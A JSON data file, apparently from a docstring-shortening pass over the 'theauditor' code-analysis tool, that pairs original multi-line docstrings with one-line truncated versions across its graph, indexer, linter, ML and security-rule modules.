    "truncated": "\"\"\"Extract Graphene GraphQL resolver methods.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/treesitter_impl.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Enforce that Tree-sitter is NEVER used for JavaScript/TypeScript.\n\n    Tree-sitter produces corrupted data for JS/TS (e.g., \"anonymous\" function names).\n    These languages MUST use the TypeScript Compiler API semantic parser.\n\n    Args:\n        language: The programming language being parsed\n\n    Raises:\n        RuntimeError: If language is JavaScript or TypeScript\n    \"\"\"",
    "truncated": "\"\"\"Enforce that Tree-sitter is NEVER used for JavaScript/TypeScript.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/typescript_impl_structure.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract function metadata from TypeScript semantic AST for symbol table.\n\n    PHASE 5: EXTRACTION-FIRST ARCHITECTURE\n\n    Now supports two modes:\n    1. PRE-EXTRACTED DATA (batch parsing) - Functions extracted in JavaScript, received directly\n    2. AST TRAVERSAL (individual parsing) - Fallback to full AST traversal for backward compatibility\n\n    This hybrid approach eliminates JSON.stringify crashes for batch parsing (512MB+ → 5MB)\n    while maintaining backward compatibility for individual file parsing.\n    \"\"\"",
    "truncated": "\"\"\"Extract function metadata from TypeScript semantic AST for symbol table.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Parse a file into an AST.\n\n        Args:\n            file_path: Path to the source file.\n            language: Programming language (auto-detected if None).\n            root_path: Absolute path to project root (for sandbox resolution).\n            jsx_mode: JSX extraction mode ('preserved' or 'transformed').\n\n        Returns:\n            AST tree object or None if parsing fails.\n        \"\"\"",
    "truncated": "\"\"\"Parse a file into an AST.\"\"\""
  },
  {
    "file": "theauditor/aws_cdk/analyzer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Convert finding dictionaries from orchestrator to CdkFinding format.\n\n        Args:\n            standard_findings: List of finding dicts from orchestrator.run_database_rules()\n                              Note: StandardFinding.to_dict() converts:\n                              - rule_name → 'rule'\n                              - file_path → 'file'\n                              - snippet → 'code_snippet'\n                              - cwe_id → 'cwe'\n                              - additional_info → 'details_json' (as JSON string)\n        \"\"\"",
    "truncated": "\"\"\"Convert finding dictionaries from orchestrator to CdkFinding format.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Graph-based dead code detection using NetworkX and graphs.db.\n\nReplaces O(n²) nested loop approach with graph reachability analysis.\nDetects zombie clusters (circular dead code) and orphaned features.\n\nNO FALLBACKS. Hard fail if graphs.db missing or malformed.\nDatabases are regenerated fresh every run - missing data = BUG.\n\nThis is the SINGLE SOURCE OF TRUTH for dead code detection.\nThe old SQL-based approximation (deadcode.py) has been merged here.\n\"\"\"",
    "truncated": "\"\"\"Graph-based dead code detection using NetworkX and graphs.db.\"\"\""
  },
  {
    "file": "theauditor/context/formatters.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Format as visual tree (for transitive queries).\n\n    Currently a placeholder - falls back to text format.\n    Full tree visualization will be implemented in future phase.\n\n    Args:\n        results: Query results\n\n    Returns:\n        Tree-formatted string (currently text format)\n    \"\"\"",
    "truncated": "\"\"\"Format as visual tree (for transitive queries).\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Validate table name against whitelist to prevent SQL injection.\n\n    Args:\n        table: Table name to validate\n\n    Returns:\n        The validated table name\n\n    Raises:\n        ValueError: If table name is not whitelisted\n    \"\"\"",
    "truncated": "\"\"\"Validate table name against whitelist to prevent SQL injection.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get imports declared in a file.\n\n        Uses refs table for what THIS file imports.\n\n        Args:\n            file_path: File path (partial match)\n            limit: Max results\n\n        Returns:\n            List of {module, kind, line} dicts\n        \"\"\"",
    "truncated": "\"\"\"Get imports declared in a file.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get files that import this file.\n\n        Uses edges table in graphs.db with graph_type='import'.\n\n        Args:\n            file_path: File path (partial match)\n            limit: Max results\n\n        Returns:\n            List of {source_file, type, line} dicts\n        \"\"\"",
    "truncated": "\"\"\"Get files that import this file.\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get calls TO symbols defined in this file.\n\n        Optimized: Single query with IN clause instead of O(N) loop.\n\n        Args:\n            file_path: File path (partial match)\n            limit: Max results\n\n        Returns:\n            List of {caller_file, caller_line, caller_function, callee_function} dicts\n        \"\"\"",
    "truncated": "\"\"\"Get calls TO symbols defined in this file.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Parse Docker base images from Dockerfile.\n    Ignores multi-stage build aliases to prevent false \"Not found\" errors.\n\n    Multi-stage builds like:\n        FROM node:18 AS base\n        FROM base AS build\n\n    The second FROM references the \"base\" stage, NOT an external image.\n    We track these aliases and skip them.\n    \"\"\"",
    "truncated": "\"\"\"Parse Docker base images from Dockerfile.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Print a report grouped by SOURCE FILE path.\n\n    This solves the \"Where the f*** is this coming from?\" problem by organizing\n    dependencies by their origin file and clearly marking test fixtures.\n\n    Args:\n        deps: List of dependency objects from parse_dependencies()\n        latest_info: Dict from check_latest_versions() with version info\n        hide_up_to_date: If True, skip files with no outdated deps (default: True)\n    \"\"\"",
    "truncated": "\"\"\"Print a report grouped by SOURCE FILE path.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Identify architectural layers using topological sorting.\n\n        Pure graph layering algorithm without interpretation.\n\n        Args:\n            graph: Import/dependency graph\n\n        Returns:\n            Dict mapping layer number to list of node IDs\n        \"\"\"",
    "truncated": "\"\"\"Identify architectural layers using topological sorting.\"\"\""
  },
  {
    "file": "theauditor/graph/analyzer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Calculate in-degree and out-degree for all nodes.\n\n        Pure counting algorithm without interpretation.\n\n        Args:\n            graph: Graph with edges\n\n        Returns:\n            Dict mapping node IDs to degree counts\n        \"\"\"",
    "truncated": "\"\"\"Calculate in-degree and out-degree for all nodes.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Find functions with high cyclomatic complexity.\n\n        [2025 BATCH PROCESSING] Uses load_file_cfgs to eliminate N+1 queries.\n\n        Args:\n            file_path: Optional filter by file path\n            threshold: Complexity threshold (default 10)\n\n        Returns:\n            List of complex functions with metrics\n        \"\"\"",
    "truncated": "\"\"\"Find functions with high cyclomatic complexity.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Build data flow graph from variable assignments.\n\n        Queries the normalized assignments + assignment_sources tables to construct\n        a graph showing how data flows through variable assignments.\n\n        Args:\n            root: Project root directory (for metadata only)\n\n        Returns:\n            Dict with nodes, edges, and metadata (same format as builder.py)\n        \"\"\"",
    "truncated": "\"\"\"Build data flow graph from variable assignments.\"\"\""
  },
  {
    "file": "theauditor/graph/dfg_builder.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Build data flow graph from function returns.\n\n        Queries the normalized function_returns + function_return_sources tables\n        to construct a graph showing how data flows through return statements.\n\n        Args:\n            root: Project root directory (for metadata only)\n\n        Returns:\n            Dict with nodes, edges, and metadata\n        \"\"\"",
    "truncated": "\"\"\"Build data flow graph from function returns.\"\"\""
  },
  {
    "file": "theauditor/graph/insights.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Backward compatibility shim for graph insights.\n\nThis file exists to maintain backward compatibility for code that imports\nfrom theauditor.graph.insights directly. All functionality has been moved to\ntheauditor.insights.graph for better organization.\n\nThis ensures that:\n  - from theauditor.graph.insights import GraphInsights  # STILL WORKS\n  - from theauditor.graph import insights  # STILL WORKS\n  - import theauditor.graph.insights  # STILL WORKS\n\"\"\"",
    "truncated": "\"\"\"Backward compatibility shim for graph insights.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Query dependencies of a node.\n\n        Args:\n            node_id: Node to query\n            direction: 'upstream', 'downstream', or 'both'\n            graph_type: 'import' or 'call'\n\n        Returns:\n            Dict with upstream and/or downstream dependencies\n        \"\"\"",
    "truncated": "\"\"\"Query dependencies of a node.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/__init__.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Graph strategies for language-specific DFG construction.\n\nThis package contains strategy implementations for different languages/frameworks:\n- PythonOrmStrategy: SQLAlchemy/Django ORM relationship expansion\n- NodeExpressStrategy: Express middleware chains and controller resolution\n\nArchitecture:\n- All strategies implement GraphStrategy base class\n- Strategies are stateless and receive DB path at build time\n- Returns standard dict with nodes, edges, metadata\n\"\"\"",
    "truncated": "\"\"\"Graph strategies for language-specific DFG construction.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/base.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Abstract base class for graph strategies.\n\nThis module defines the contract that all language-specific strategies must follow.\nStrategies encapsulate framework-specific logic (Express, Django ORM, etc.) that\nwould otherwise pollute the core DFGBuilder.\n\nArchitecture:\n- Strategies are stateless (mostly) - they receive DB access at build time\n- They return standard Graph dictionaries compatible with DFGBuilder\n- If a strategy fails, it should not crash the entire graph build\n\"\"\"",
    "truncated": "\"\"\"Abstract base class for graph strategies.\"\"\""
  },
  {
    "file": "theauditor/graph/visualizer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Generate DOT format with visual intelligence encoding.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges'\n            analysis: Optional analysis results with cycles, hotspots, etc.\n            options: Optional visualization options\n\n        Returns:\n            DOT format string ready for Graphviz\n        \"\"\"",
    "truncated": "\"\"\"Generate DOT format with visual intelligence encoding.\"\"\""
  },
  {
    "file": "theauditor/graph/visualizer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Generate DOT highlighting impact analysis results.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges'\n            impact: Impact analysis with targets, upstream, downstream\n            options: Optional visualization options\n\n        Returns:\n            DOT format string with impact highlighting\n        \"\"\"",
    "truncated": "\"\"\"Generate DOT highlighting impact analysis results.\"\"\""
  },
  {
    "file": "theauditor/graph/visualizer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Generate DOT format showing only nodes and edges involved in cycles.\n\n        Args:\n            graph: Graph dict with 'nodes' and 'edges'\n            cycles: List of cycle dicts with 'nodes' lists\n            options: Optional visualization options\n\n        Returns:\n            DOT format string with only cycle-related elements\n        \"\"\"",
    "truncated": "\"\"\"Generate DOT format showing only nodes and edges involved in cycles.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Validate table name against schema to prevent SQL injection.\n\n    Args:\n        table: Table name to validate\n\n    Returns:\n        The validated table name\n\n    Raises:\n        ValueError: If table name is not in TABLES registry\n    \"\"\"",
    "truncated": "\"\"\"Validate table name against schema to prevent SQL injection.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/base_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Base database manager with core infrastructure.\n\nThis module contains the BaseDatabaseManager class which provides:\n- Database connection management\n- Transaction control\n- Schema creation and validation\n- Generic batch flushing system\n- Table clearing\n\nAll language-specific add_* methods are provided by mixin classes.\n\"\"\"",
    "truncated": "\"\"\"Base database manager with core infrastructure.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/core_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add a function return statement record to the batch.\n\n        ARCHITECTURE: Normalized many-to-many relationship.\n        - Phase 1: Batch function return record (without return_vars column)\n        - Phase 2: Batch junction records for each return variable\n\n        Args:\n            col: Column position (required for minified files where multiple returns on same line)\n\n        NO FALLBACKS. If return_vars is malformed, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a function return statement record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/frameworks_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add a router mount record to the batch.\n\n        ADDED 2025-11-09: Phase 6.7 - AST-based route resolution\n\n        Args:\n            file: File containing the router.use() statement\n            line: Line number\n            mount_path_expr: Mount path expression ('/areas', 'API_PREFIX', or `${API_PREFIX}/auth`)\n            router_variable: Router variable name ('areaRoutes', 'protectedRouter')\n            is_literal: True if static string, False if identifier/template\n        \"\"\"",
    "truncated": "\"\"\"Add a router mount record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add a GraphQL field directive to the batch (junction table).\n\n        Schema: graphql_field_directives(id, field_id, directive_name, arguments_json)\n\n        Args:\n            field_id: FK to graphql_fields.field_id\n            directive_name: Directive name with @ prefix (e.g., '@auth', '@deprecated')\n            arguments_json: JSON object of directive arguments (optional)\n\n        NO FALLBACKS. field_id MUST exist.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL field directive to the batch (junction table).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add an Angular module PARENT RECORD ONLY to the batch.\n\n        ARCHITECTURE: Normalized storage - parent record only.\n        Junction data (declarations, imports, providers, exports) stored via dedicated methods:\n        - add_angular_module_declaration()\n        - add_angular_module_import()\n        - add_angular_module_provider()\n        - add_angular_module_export()\n\n        NO FALLBACKS. NO JUNCTION DISPATCH. SINGLE CODE PATH.\n        \"\"\"",
    "truncated": "\"\"\"Add an Angular module PARENT RECORD ONLY to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/planning_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add a phase to a plan (hierarchical planning structure).\n\n        Args:\n            plan_id: Foreign key to plans table\n            phase_number: Sequential phase number (1, 2, 3...)\n            title: Phase title (e.g., \"Verify File is Active\")\n            description: What this phase accomplishes\n            success_criteria: What completion looks like for this phase (criteria)\n            status: Phase status (pending, in_progress, completed)\n            created_at: ISO timestamp\n        \"\"\"",
    "truncated": "\"\"\"Add a phase to a plan (hierarchical planning structure).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add a Python package configuration (pyproject.toml/requirements.txt) to the batch.\n\n        Args:\n            file_path: Path to the dependency file\n            file_type: 'pyproject' or 'requirements'\n            project_name: Package name (from pyproject.toml)\n            project_version: Package version (from pyproject.toml)\n            dependencies: JSON array of dependency dicts\n            optional_dependencies: JSON object with optional dependency groups\n            build_system: JSON object with build system info\n        \"\"\"",
    "truncated": "\"\"\"Add a Python package configuration (pyproject.toml/requirements.txt) to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/python_database.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Add a Python type definition - returns row ID for junction table FK.\n\n        CRITICAL: Uses direct cursor.execute() to return lastrowid for junction FK.\n        DO NOT USE BATCHING - junction tables need parent ID.\n\n        Args:\n            type_kind: 'typed_dict', 'generic', 'protocol'\n\n        Returns:\n            int: Row ID of inserted type definition (for python_typeddict_fields FK)\n        \"\"\"",
    "truncated": "\"\"\"Add a Python type definition - returns row ID for junction table FK.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Abstract base class for all language extractors.\n\n    Provides minimal string-based fallback methods for files without AST parsers\n    (configuration files, etc.). Language-specific extractors should use AST-based\n    extraction instead of these methods.\n\n    Design Philosophy:\n    - AST-first: Language extractors (Python, JS) should use AST parsers\n    - String fallback: Only for config files (webpack, nginx, docker-compose)\n    - Pattern quality: Only include patterns with low false positive rates\n    \"\"\"",
    "truncated": "\"\"\"Abstract base class for all language extractors.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract field metadata from AST node.\n\n        Args:\n            node: GraphQL field definition node\n            type_id: Parent type ID\n            field_id: Field ID\n            type_name: Parent type name (for test convenience)\n\n        Returns:\n            Dict with field metadata or None if invalid\n        \"\"\"",
    "truncated": "\"\"\"Extract field metadata from AST node.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Load path aliases from indexed file structure.\n\n    Detects common project structures (src/, app/) and sets up\n    conventional aliases (@/, ~/).\n\n    Args:\n        cursor: SQLite cursor\n\n    Returns:\n        Dict mapping alias prefixes to base paths\n    \"\"\"",
    "truncated": "\"\"\"Load path aliases from indexed file structure.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/prisma.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Parse Prisma schema content to extract models.\n\n        Inline parsing logic (copied from prisma_schema_parser.py).\n        Uses regex to extract model definitions and fields.\n\n        Args:\n            content: schema.prisma file content\n\n        Returns:\n            List of model dictionaries with fields\n        \"\"\"",
    "truncated": "\"\"\"Parse Prisma schema content to extract models.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Extract Python dependencies from pyproject.toml or requirements.txt.\n\n    Main entry point for Python dependency extraction.\n\n    Args:\n        file_path: Path to dependency file\n        content: File content\n\n    Returns:\n        Dict with parsed dependencies or None if not a dependency file\n    \"\"\"",
    "truncated": "\"\"\"Extract Python dependencies from pyproject.toml or requirements.txt.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/__init__.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Store extracted data via domain-specific handlers.\n\n        Args:\n            file_path: Path to the file being indexed\n            extracted: Dictionary of extracted data (data_type -> data list)\n            jsx_pass: True if this is JSX preserved mode (second pass)\n\n        Returns:\n            Receipt dict mapping data_type -> count of items passed to handlers.\n            Used by fidelity control to verify no data loss.\n        \"\"\"",
    "truncated": "\"\"\"Store extracted data via domain-specific handlers.\"\"\""
  },
  {
    "file": "theauditor/insights/impact_analyzer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Calculate a coupling score (0-100) based on impact metrics.\n\n    Higher score = more tightly coupled = higher risk.\n\n    Args:\n        impact_data: Results from analyze_impact\n\n    Returns:\n        Integer score 0-100\n    \"\"\"",
    "truncated": "\"\"\"Calculate a coupling score (0-100) based on impact metrics.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Convenience function to load all database features at once.\n\n    Args:\n        db_path: Path to repo_index.db\n        file_paths: List of files to analyze\n        session_dir: Optional path to Claude session logs (enables Tier 5 features)\n        graveyard_path: Optional path to comment_graveyard.json (enables hallucination detection)\n\n    Returns combined dict with all feature categories.\n    \"\"\"",
    "truncated": "\"\"\"Convenience function to load all database features at once.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/features.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Database feature extraction for ML training.\n\nExtracts 50+ semantic features from repo_index.db tables:\n- Security patterns (JWT, SQL, secrets, crypto)\n- Vulnerability flows (taint findings, CWE counts)\n- Type coverage (TypeScript annotations)\n- CFG complexity (control flow graphs)\n- Graph topology (imports, exports, centrality)\n- Semantic imports (HTTP, DB, Auth, Test libraries)\n- AST complexity (functions, classes, calls)\n\"\"\"",
    "truncated": "\"\"\"Database feature extraction for ML training.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Parse .github/workflows/*.yml for CI/CD metadata.\n\n    FUTURE ENHANCEMENT: Not implemented yet, but reserved for:\n    - Workflow trigger frequency\n    - Test success rates\n    - Deployment frequency\n\n    Returns:\n        Dict mapping workflow files to metadata (currently empty)\n    \"\"\"",
    "truncated": "\"\"\"Parse .github/workflows/*.yml for CI/CD metadata.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/intelligence.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Parse git worktrees for active development branch analysis.\n\n    FUTURE ENHANCEMENT: Not implemented yet, but reserved for:\n    - Number of active worktrees\n    - Branch divergence metrics\n    - Parallel development detection\n\n    Returns:\n        Dict mapping worktree paths to metadata (currently empty)\n    \"\"\"",
    "truncated": "\"\"\"Parse git worktrees for active development branch analysis.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Apply semantic context to findings.\n\n        This is the core algorithm that applies your business logic to TheAuditor's\n        findings. Each finding is checked against all patterns and classified.\n\n        Args:\n            findings: List of finding dictionaries from TheAuditor\n\n        Returns:\n            ClassificationResult with categorized findings\n        \"\"\"",
    "truncated": "\"\"\"Apply semantic context to findings.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get path to binary in venv.\n\n        Args:\n            name: Binary name (e.g., 'ruff', 'mypy')\n\n        Returns:\n            Path to binary\n\n        Raises:\n            FileNotFoundError: If binary is not found in venv\n        \"\"\"",
    "truncated": "\"\"\"Get path to binary in venv.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Run ESLint on a single batch of files.\n\n        Args:\n            files: Batch of file paths to lint\n            eslint_bin: Path to ESLint binary\n            config_path: Path to ESLint config\n            batch_num: Batch number for output file naming\n\n        Returns:\n            List of finding dictionaries from this batch\n        \"\"\"",
    "truncated": "\"\"\"Run ESLint on a single batch of files.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Run Ruff on a single batch of files.\n\n        Args:\n            files: Batch of file paths to lint\n            ruff_bin: Path to Ruff binary\n            config_path: Path to Ruff config\n            batch_num: Batch number for output file naming\n\n        Returns:\n            List of finding dictionaries from this batch\n        \"\"\"",
    "truncated": "\"\"\"Run Ruff on a single batch of files.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Run Mypy on a single batch of files.\n\n        Args:\n            files: Batch of file paths to type-check\n            mypy_bin: Path to Mypy binary\n            config_path: Path to Mypy config\n            batch_num: Batch number for output file naming\n\n        Returns:\n            List of finding dictionaries from this batch\n        \"\"\"",
    "truncated": "\"\"\"Run Mypy on a single batch of files.\"\"\""
  },
  {
    "file": "theauditor/ml.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Backward compatibility shim for ML insights.\n\nThis file exists to maintain backward compatibility for code that imports\nfrom theauditor.ml directly. All functionality has been moved to\ntheauditor.insights.ml for better organization.\n\nThis ensures that:\n  - from theauditor.ml import learn  # STILL WORKS\n  - from theauditor.ml import suggest  # STILL WORKS\n  - import theauditor.ml  # STILL WORKS\n\"\"\"",
    "truncated": "\"\"\"Backward compatibility shim for ML insights.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Create planning.db if it doesn't exist and initialize schema.\n\n        Also initializes shadow git repository (.pf/snapshots.git) for\n        efficient snapshot storage using pygit2.\n\n        Args:\n            db_path: Path to planning.db\n\n        Returns:\n            PlanningManager instance\n        \"\"\"",
    "truncated": "\"\"\"Create planning.db if it doesn't exist and initialize schema.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get snapshot by ID with associated diffs.\n\n        If snapshot has shadow_sha, retrieves diff from shadow git repo.\n        Otherwise falls back to legacy code_diffs table.\n\n        Args:\n            snapshot_id: ID of snapshot\n\n        Returns:\n            dict with snapshot details and diffs/diff_text\n        \"\"\"",
    "truncated": "\"\"\"Get snapshot by ID with associated diffs.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get unified diff for a snapshot from shadow git repo.\n\n        Args:\n            snapshot_id: ID of snapshot\n\n        Returns:\n            str: Unified diff text (empty string if no changes)\n\n        Raises:\n            ValueError: If snapshot not found or has no shadow_sha\n        \"\"\"",
    "truncated": "\"\"\"Get unified diff for a snapshot from shadow git repo.\"\"\""
  },
  {
    "file": "theauditor/project_summary.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Generate comprehensive project summary markdown report.\n\n    Args:\n        root_path: Root directory of project\n        manifest_path: Path to manifest.json\n        db_path: Path to repo_index.db\n\n    Returns:\n        Markdown formatted project summary report\n    \"\"\"",
    "truncated": "\"\"\"Generate comprehensive project summary markdown report.\"\"\""
  },
  {
    "file": "theauditor/rules/common/util.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Calculate Shannon entropy of a string.\n\n        High entropy (>4.0) typically indicates random strings like API keys.\n        Low entropy (<3.0) typically indicates natural language or simple patterns.\n\n        Args:\n            text: String to analyze\n\n        Returns:\n            Shannon entropy value (0.0 for empty strings)\n        \"\"\"",
    "truncated": "\"\"\"Calculate Shannon entropy of a string.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/bundle_size.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect full-package imports of large libraries in frontend code.\n\n    Checks import_styles table for full imports of known large packages that\n    should use selective/tree-shaken imports to reduce bundle size.\n\n    Args:\n        context: Rule execution context\n\n    Returns:\n        List of findings for inefficient imports\n    \"\"\"",
    "truncated": "\"\"\"Detect full-package imports of large libraries in frontend code.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/peer_conflicts.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect peer dependency version mismatches.\n\n    Checks if peer dependency requirements match actual installed versions.\n    Common issue: Installing a library that requires React ^17 when project uses React 18.\n\n    Args:\n        context: Rule execution context\n\n    Returns:\n        List of findings for peer dependency conflicts\n    \"\"\"",
    "truncated": "\"\"\"Detect peer dependency version mismatches.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/update_lag.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect severely outdated dependencies from deps_latest.json.\n\n    Reads version comparison data from .pf/raw/deps_latest.json (created by\n    'aud deps --check-latest') and reports packages that are 2+ major versions behind.\n\n    Args:\n        context: Rule execution context\n\n    Returns:\n        List of findings for severely outdated dependencies\n    \"\"\"",
    "truncated": "\"\"\"Detect severely outdated dependencies from deps_latest.json.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/docker_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect hardcoded secrets in ENV and ARG instructions.\n\n    ENV and ARG values are stored in image layers and can be inspected\n    by anyone with access to the image. Secrets must use Docker secrets\n    or external secret managers.\n\n    Detection methods:\n    1. Sensitive key names (PASSWORD, TOKEN, etc.)\n    2. Known secret patterns (GitHub PAT, AWS keys, etc.)\n    3. High Shannon entropy (random-looking strings)\n    \"\"\"",
    "truncated": "\"\"\"Detect hardcoded secrets in ENV and ARG instructions.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/express_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Express.js Framework Security Analyzer - Database-First Approach.\n\nAnalyzes Express.js applications for security vulnerabilities using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Express.js Framework Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/flask_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Flask Framework Security Analyzer - Database-First Approach.\n\nAnalyzes Flask applications for security vulnerabilities using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Flask Framework Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/nextjs_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Next.js Framework Security Analyzer - Database-First Approach.\n\nAnalyzes Next.js applications for security vulnerabilities using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Next.js Framework Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/react_analyze.py",
    "line": -1,
    "original_lines": 11,
